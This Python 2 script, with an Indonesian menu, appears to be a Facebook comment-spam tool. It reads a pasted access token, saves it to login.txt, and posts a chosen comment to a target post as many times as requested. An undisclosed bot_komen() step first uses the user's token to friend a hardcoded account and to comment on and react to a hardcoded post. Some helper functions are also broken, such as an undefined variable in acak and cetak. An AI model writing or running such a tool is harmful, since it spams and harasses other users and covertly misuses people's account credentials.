#!/usr/bin/python2
#coding=utf-8
# bebas recode

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')]


def keluar():
	print "\033[0;39m[!] \x1b[0;39mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
░██████╗██████╗░░█████╗░███╗░░░███╗
██╔════╝██╔══██╗██╔══██╗████╗░████║
╚█████╗░██████╔╝███████║██╔████╔██║
░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║
██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║
╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝
\033[41;1m SPAM KOMENTAR \033[00;1m

\033[32;1mGithub \033[33;1m:\033[37;1m RUL-Z
\033[32;1mFacebook \033[33;1m:\033[37;1m PAHRUL

"""
def masuk():
    os.system('clear')
    print logo
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mMasuk Jalur Sesat'
    print '\033[37;1m[\033[32;1m00\033[37;1m] \033[34;1mexit'
    asup()
    


def asup():
    milih = raw_input('\033[31;1m Mau Pilih yg mana bruh\033[32;1m ︻氕言テ一一一 \033[37;1m')
    if milih == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        time.sleep(2)
        asup()
    elif milih == '1' or milih == '01':
        token()
    elif milih == '2' or milih == '02':
        os.system("clear")
        os.system("git pull")
        balik = raw_input("\033[31;1m[<back>]")
        os.system('clear')
    elif milih == '0' or milih == '00':
        keluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + milih + ' not found'
        asup()

def token():
    os.system('clear')
    print logo
    toke = raw_input('\033[37;1m[\033[32;1m*\033[37;1m] \033[34;1minput token\033[33;1m: \033[37;1m')
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=' + toke)
        a = json.loads(gas.text)
        nyimpen = open('login.txt', 'w')
        nyimpen.write(toke)
        nyimpen.close()
        print 'Token valid'
        bot_komen()
    except KeyError:
        print 'Token invalid !'
        time.sleep(1.7)
        masuk()


def bot_komen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100024540287354'
    kom = 'Nice😘'
    reac = 'LOVE'
    post = '946670209494313'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
    menu()


def menu():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toke)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mConnection Error'
        kaluar()

    os.system('clear')
    print logo
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mSpam Comment'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mExit and Delete Token'
    pilih()

def pilih():
    milih = raw_input('\033[31;1m Mau Pilih yg mana bruh\033[32;1m ︻氕言テ一一一 \033[37;1m')
    if milih == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        pilih()
    elif milih == '1' or milih == '01':
        spamkomen()
    elif milih == '0' or milih == '00':
        os.system('clear')
        jalan('\033[34;1mDelete token')
        os.system('rm -rf login.txt')
        kaluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + milih + ' not found'
        pilih()


# spam comment
def spamkomen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        os.system('python2 Spamer.py')
    os.system("clear")
    print logo
    post = raw_input("\033[32;1mID Post \033[34;1m=> \033[37;1m")
    kom = raw_input("\033[32;1mComment \033[34;1m=> \033[37;1m")
    jml = int(input("\033[32;1mCount \033[34;1m=> \033[37;1m"))
    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mplease wait...'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
    balik = raw_input('\033[31;1m[<back>]\n')
    menu()


if __name__ == '__main__':
    menu()
    masuk()

